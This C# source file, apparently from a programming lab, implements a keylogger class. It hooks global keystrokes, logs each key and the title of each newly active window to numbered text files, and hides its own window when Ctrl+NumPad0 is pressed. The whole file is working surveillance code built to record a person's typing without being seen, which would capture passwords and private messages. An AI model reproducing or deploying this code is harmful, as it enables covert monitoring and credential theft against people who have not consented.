using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Lab13_Server
{
    class Logger
    {
        private WQLUtil.Util.Window.WindowManager w;
        private WQLUtil.Util.Mouse.MouseManager m;
        private RichTextBox richTextBox1;
        private StreamWriter sw;
        private int i = 0;
        private int s = 0;
        private bool hide = false;
        private MWindow mWindow;

        public Logger(RichTextBox richTextBox1, MWindow win)
        {
            this.richTextBox1 = richTextBox1;
            w = new WQLUtil.Util.Window.WindowManager(WinEventProc);
            m = new WQLUtil.Util.Mouse.MouseManager();
            m.Hook.KeyPress += new KeyPressEventHandler(ExtKeyPress);
            m.Hook.KeyUp += new KeyEventHandler(ExtKeyUp);
            sw = new StreamWriter("Sample"+i+".txt");
            mWindow = win;
        }


        private void Log(string txt)
        {
            richTextBox1.AppendText(txt);
            sw.Write(txt);
            if (!hide)
            {
                if (s == 1)
                {
                    if (txt.Contains("NumPad0"))
                    {
                        //Debug.Print("OCULTANDO INTERFAZ");
                        mWindow.Visible = false;
                        s = 0;
                        hide = true;
                    }
                }
                if (txt.Contains("LControlKey"))
                {
                    s = 1;
                }
                else
                {
                    s = 0;
                }

            }
            else
            {
                if (s == 1)
                {
                    if (txt.Contains("NumPad0"))
                    {
                        //Debug.Print("OCULTANDO INTERFAZ");
                        mWindow.Visible = true;
                        s = 0;
                        hide = false;
                    }
                }
                if (txt.Contains("LControlKey"))
                {
                    s = 1;
                }
                else
                {
                    s = 0;
                }
            }

        }

        
        public void Close()
        {
            try
            {
                sw.Close();
                //File.Delete("Sample" + i + ".txt");
                i++;                
                sw = new StreamWriter("Sample"+i+".txt");

            }
            catch(Exception e)
            {

            }
            
        }

        public void ExtKeyPress(object sender, KeyPressEventArgs e)
        {
            //Log("KeyPress:  " + e.KeyChar);
            Log(""+e.KeyChar);
        }

        public void ExtKeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyValue == 13)
            {
                richTextBox1.AppendText(" \n");
                Log(" \n");
            }
            if (e.KeyValue != 32)
            {            
                if ((e.KeyValue < 65) || (e.KeyValue > 90))
                {
                    Log(" " + e.KeyData+" ");
                }
            }
        }

        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            Log("\n Active Window - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + " \n");
        }
        
    }

    
}
